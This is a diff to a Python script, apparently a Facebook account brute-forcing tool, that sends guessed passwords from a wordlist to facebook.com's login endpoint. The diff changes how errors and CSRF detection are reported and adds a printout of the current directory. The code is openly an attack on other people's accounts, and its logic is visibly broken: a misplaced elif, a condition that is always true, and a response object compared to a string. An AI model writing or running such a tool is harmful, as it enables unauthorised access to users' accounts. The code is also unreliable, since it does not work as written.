@@ -25,11 +25,13 @@ print(Fore.BLUE + '''
 ------\     (__)
        `-----"
 ''')
+currentdir = os.getcwd()
+error = requests.get('https://facebook.com/login?')
 time.sleep(0.1)
 print(Fore.GREEN + 'Created By FonderElite || Droid')
 print(Fore.MAGENTA + 'Visit My GitHub Page: https://github.com/FonderElite')
 print(Fore.MAGENTA + 'Visit Our WebSIte: https://singularity.rf.gd')
-os = Fore.RED + platform.system()
+oof = Fore.RED + platform.system()
 time.sleep(2)
 time.sleep(1)
 sys.stdout.write(Fore.GREEN + '\rLoading.')
@@ -111,8 +113,9 @@ except ImportError:
 time.sleep(1)
 print(Fore.GREEN + 'Done!')
 print(help)
+print(wi + gr + "Current Directory: " + wi + currentdir)
 time.sleep(2)
-command = input(Fore.RED +  ">"  + os + "-User: ")
+command = input(Fore.RED +  ">"  + oof + "-User: ")
 if command == "./fbbruteforce -h":
     print(help)
 
@@ -138,15 +141,14 @@ elif command == "./fbbruteforce -id -w -s":
      count += 1
      print(Fore.RED + '[+]' + gr +   wi + gr + "Trying Password: " + i)
      response = requests.post('https://facebook.com/login?',data=payload)
-     error = response.status_code
      print(wi + Fore.RED + 'Failed.')
-elif error <= 499:
- print(Fore.RED + "Error Occured. Status Code 400 and Above")
+elif error == "400":
+ print(Fore.RED + "Error Occured. Status Code 400 encountered")
  print(Fore.MAGENTA + "BruteForce Failed!")
  pass
 
 elif "CSRF" or 'csrf' in str(response.content):
- print(Fore.RED + "CSRF Token Detected!")
+ print(Fore.RED + "CSRF Token Detected! or SPACING!")
  exit()
 elif command == "./fbbruteforce -q":
     print(Fore.RED + "(っ◔◡◔)っ ♥ Quitting.... ♥")
